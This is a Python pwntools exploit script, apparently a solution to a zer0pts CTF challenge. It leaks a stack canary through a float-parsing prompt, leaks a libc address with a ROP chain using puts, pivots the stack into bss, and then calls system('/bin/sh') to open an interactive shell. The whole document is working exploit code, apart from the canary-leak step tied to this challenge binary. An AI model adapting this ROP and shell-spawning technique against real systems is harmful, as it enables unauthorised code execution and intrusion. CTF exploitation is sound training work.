#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', env={ 'LD_PRELOAD': './libc.so.6' })
else:
    s = remote('pwn.ctf.zer0pts.com', 9002)

s.sendlineafter('name?\n> ', 'A' * 0x40)
s.sendlineafter('try?\n> ', '27')

s.sendlineafter('Time[sec]: ', '+')
s.recvuntil('close to ')
canary = u64(struct.pack('d', float(s.recvuntil(' ')[:-1])))
log.info('canary: %#x' % canary)

s.sendline('\n')

pop_rdi = 0x400e93
pop_rsi_r15 = 0x400e91
leave = 0x400899
ret = 0x4006a6

elf = ELF('./chall')
libc = ELF('./libc.so.6')

payload = ''
payload += 'A' * 0x18
payload += p64(canary)
payload += p64(elf.bss(0x500 - 8))
payload += p64(pop_rdi) + p64(elf.got['__libc_start_main'])
payload += p64(elf.symbols['puts'])
payload += p64(pop_rdi) + p64(elf.search('%s').next())
payload += p64(pop_rsi_r15) + p64(elf.bss(0x500)) + p64(0)
payload += p64(ret)
payload += p64(elf.symbols['__isoc99_scanf'])
payload += p64(leave)

s.sendlineafter('Play again? (Y/n) ', payload)

libc.address = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['__libc_start_main']
log.info('libc base: %#x' % libc.address)

payload = ''
payload += p64(pop_rdi) + p64(libc.search('/bin/sh\0').next())
payload += p64(libc.symbols['system'])

s.sendline(payload)

s.interactive()
